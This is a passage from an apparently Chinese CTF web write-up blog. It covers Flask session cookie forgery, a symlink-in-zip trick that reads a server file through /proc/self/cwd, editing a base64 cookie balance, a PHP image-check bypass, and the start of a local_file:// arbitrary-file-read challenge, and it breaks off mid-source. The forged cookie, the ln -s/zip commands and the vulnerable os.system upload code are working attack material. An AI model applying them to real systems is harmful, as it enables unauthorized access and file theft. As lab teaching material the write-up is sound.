src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718232919.png" alt="image-20200718232918985"></p> <p>再看一下响应头，发现了可疑的信息</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718233038.png" alt="image-20200718233038897"></p> <p>base64解码一下，拿到secret_key</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200718233121.png" alt="image-20200718233121423"></p> <p>下面用工具开始解码和伪造：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener noreferrer">flask session编码解码工具github项目地址<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071401.png" alt="image-20200719071354283"></p> <p>解码之后的结果：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{'id': b'100', 'is_login': True, 'password': b'admin', 'username': b'admin'}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>既然账号密码全都是admin还没有权限的话，这里我猜应该是改id</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>{'id': b'1', 'is_login': True, 'password': b'admin', 'username': b'admin'}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>进行编码</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071809.png" alt="image-20200719071658065"></p> <p>编码之后的结果：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojAwPKkkMNwErLi1OLcpLzE3FIlkLAF55HTM.XxOCxQ.Kt2NK_KSt2lT5nZL3BOpgIfEja8
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>改一下cookie，可以上传文件了</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719071803.png" alt="image-20200719071756122"></p> <p>查看网页源代码可以拿到文件上传部分的源码，源码如下(部分关键位置已经做了注释)</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># 路由1/upload get post方法获取参数</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>
        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">&quot;/&quot;</span>
        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>
        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename
        pathname <span class="token operator">=</span> path <span class="token operator">+</span> filename
        <span class="token comment">#只能上传zip文件</span>
        <span class="token keyword">if</span> <span class="token string">&quot;zip&quot;</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#unzip命令用于解压zip文件</span>
            <span class="token comment">#-n 解压缩时不要覆盖原有的文件</span>
            <span class="token comment">#-d&lt;目录&gt; 指定文件解压缩后所要存储的目录。</span>
            <span class="token comment">#cmd是解压之后文件的内容</span>
            cmd <span class="token operator">=</span> <span class="token string">&quot;unzip -n -d &quot;</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">&quot; &quot;</span><span class="token operator">+</span> pathname
            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
				waf<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
            <span class="token comment">#直接执行cmd命令 解压该文件</span>
            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'error'</span>
        <span class="token comment">#zipfile.ZipFile   'r' 表示打开一个存在的只读zip文件，这里的filename参数就是我们上传的zip文件的路径</span>
        <span class="token comment">#只读的方式打开上传的zip文件</span>
        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        <span class="token comment">#unzip_file是之前打开的文件 .namelist()返回zip文件中的文件列表</span>
        <span class="token comment">#拿到zip文件里的第一个文件名赋值给unzip_filename</span>
        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'not login'</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment">#过滤了'/'</span>
            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string">'error'</span>
            <span class="token comment">#这里的逻辑应该是拿到zip文件中的第一个文件，读取该文件并返回</span>
            <span class="token comment">#正常情况下zip文件中是一个图片的话会正常返回</span>
            <span class="token comment">#软连接攻击</span>
            <span class="token comment">#创建一个./flag/flag.jpg的软连接 让下面代码引用并返回</span>
            <span class="token comment">#利用open()函数来打开我们创造的软链接，并返回flag.jpg的内容</span>
            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>
            <span class="token keyword">return</span> resp
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">'error'</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>
        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>
        <span class="token keyword">return</span> resp
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&quot;can't give you&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br></div></div><p>软链接攻击</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>ln -s /proc/self/cwd/flag/flag.jpg 123
// flag.jpg再当前flask目录下的flag目录下，想要读取到flag.jpg，我们必须知道flask的运行目录在哪里
// /proc/self记录系统运行的信息，cwd记录当前进程运行目录的一个符号链接，/proc/self/cwd就记录了当前flask运行目录
// ln -s xxx 123 ：将123作为指向xxx的软链接

zip -ry 123.zip 123
// zip -y ： 直接保存符号连接，而非该连接所指向的文件。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719073112.png" alt="image-20200719073112191"></p> <p>将我们得到的zip文件上传，在bp中即可拿到flag</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719073536.png" alt="image-20200719073447920"></p> <h3 id="cookie-store"><a href="#cookie-store" class="header-anchor">#</a> Cookie Store</h3> <p><strong>考点：</strong></p> <ul><li><strong>session伪造</strong></li></ul> <p>100块钱买flag，我们只有50块钱，看了一下cookie，直接base64解码改一下钱，然后再改一下cookie就可以了</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719103844.png" alt="image-20200719103844429"></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200719103912.png" alt="image-20200719103912179"></p> <h3 id="avatar-uploader-1"><a href="#avatar-uploader-1" class="header-anchor">#</a> Avatar Uploader 1</h3> <p><strong>考点：</strong></p> <ul><li><strong>getimagesize()和finfo_file()的执行差异</strong></li></ul> <p>题目直接给了源码，关键部分代码如下：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//upload.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// check whether file is uploaded</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file size</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file type</span>
<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// check file width/height</span>
<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// I hope this never happens...</span>
  <span class="token function">error</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> <span class="token punctuation">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/code&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// ok</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span>random_bytes<span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'.png'</span><span class="token punctuation">;</span>
<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">flash</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'info'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">redirect</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p>上传一个图片，分别用finfo_file()和getimagesize()进行两次检测，第一层的finfo_file()检测文件的mime类型必须是image/png，第二层的imagesize()检测如果文件的后缀名不是png就会给出flag。</p> <p>两次检测看似矛盾，但是可以利用两个函数的执行差异来进行绕过：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213013.png" alt="image-20200720213013305"></p> <p>对于这种在十六进制查看器中的只有一行的PNG文件，使用finfo_file()函数会检测出mime类型为image/png，但是getimagesize()函数却无法检测其类型，本地测试如下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213447.png" alt="image-20200720213447062"></p> <p>上传该文件，拿到flag：</p> <img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213818.png" alt="image-20200720213818562"> <p><strong>Tips:</strong></p> <ul><li><strong>这两个函数对于文件后缀名的检测都是基于文件十六进制内容的检测，所以一个正常的png文件单纯修改文件名是无法进行绕过的，本地测试如下：</strong></li></ul> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200720213741.png" alt="image-20200720213739229"></p> <p>可以看到，尽管修改之后的文件后缀名为jpg，但是经过函数处理之后的mime类型仍然是image/png。</p> <h3 id="ciscn2019-华东南赛区-web4"><a href="#ciscn2019-华东南赛区-web4" class="header-anchor">#</a> [CISCN2019 华东南赛区]Web4</h3> <p><strong>考点：</strong></p> <ul><li><strong>flask session伪造</strong></li> <li><strong>Linux系统知识</strong></li> <li><strong>任意文件读取</strong></li> <li><strong>伪随机数</strong></li></ul> <p>进入题目，点击Read somethings：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727210152.png" alt="image-20200727210152300"></p> <p>看路由很像flask，并且存在url参数，可能造成任意文件读取，用local_file://协议读一下：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727210350.png" alt="image-20200727210350494"></p> <p>读取成功，另外在<strong>python3下local_file://协议可以省略，直接写文件名可以可以读取的。</strong></p> <p>读一下源码：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200727212241.png" alt="image-20200727210622961"></p> <p>源码如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># encoding:utf-8</span>
<span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>

